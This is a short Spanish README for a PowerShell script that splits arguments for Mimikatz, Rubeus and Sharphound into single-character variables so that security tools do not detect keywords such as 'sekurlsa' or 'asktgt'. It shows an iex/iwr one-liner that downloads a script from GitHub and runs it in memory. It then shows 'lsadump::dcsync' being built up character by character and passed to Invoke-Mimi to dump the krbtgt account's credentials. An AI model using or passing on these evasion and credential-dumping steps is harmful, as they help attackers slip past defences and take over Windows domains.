# Split De Argumentos en Powershell

## Descripción
Este script sencillo permite realizar un split de argumentos en herramientas como Sharphound, Rubeus y Mimikatz, las cuales podrían ser detectadas por soluciones de seguridad al ejecutarse con palabras clave como Invoke-BloodHound, sekurlsa, asktgt, entre otras.


### Carga del modulo
1. Carga el script a memoria:  
   ```powershell
   iex (iwr -Uri https://raw.githubusercontent.com/dr0pc/ArgSplitPS/refs/heads/main/ArgSplitPS.ps1 -UseBasicParsing)
2. Ejecución del Script
   ```powershell
   Psplit-args "lsadump::dcsync"
   
3. Carga las variables en la consola Powershell del objtivo
   ```powershell
    $char1 = "l"
    $char2 = "s"
    $char3 = "a"
    $char4 = "d"
    ..
    ..
    $char14 = "n"
    $char15 = "c"
    $pwnd = $char1 + $char2 + $char3 + $char4 + $char5 + $char6 + $char7 + $char8 + $char9 + $char10 + $char11 + $char12 + $char13 + $char14 + $char15

4. Ejecutar la Tool con la variable $pwnd
   ```powershell
    Invoke-Mimi -Command "$pwnd /user:netbiosdomain\krbtgt" "exit"
